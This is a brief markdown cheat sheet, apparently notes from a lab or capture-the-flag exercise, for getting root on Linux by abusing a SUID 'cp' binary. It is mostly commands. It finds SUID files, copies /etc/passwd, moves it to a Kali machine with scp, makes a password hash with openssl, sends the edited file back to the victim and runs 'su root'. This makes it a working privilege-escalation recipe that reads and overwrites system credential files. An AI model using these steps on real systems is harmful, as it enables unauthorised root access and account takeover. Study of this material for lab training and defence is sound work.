### Scan for SUID files
```
find / -perm -4000 -type f 2>/dev/null
```

**check permissions individually**
**The `cp` binary has the SUID permissions**

#### Copy and Transfer the `cp` file
```
cp /etc/passwd /tmp/passwd
```
- **Unfortunately, the `cp` command retains the permissions of the original file, so you can't edit the file on the target machine.**

**Kali machine**
```bash
scp <victim-username>@<victim-ip>:<path_to_file> <path_on_kali>
```

#### Generate a hash
```bash
openssl passwd -1 -salt <my_salt> <password123>
```

**edit the file and transfer back to the victim**
```bash
scp <local_file> <victim_username>@<victim_ip>:<remote_path>
```

### Access root
```
su root
```



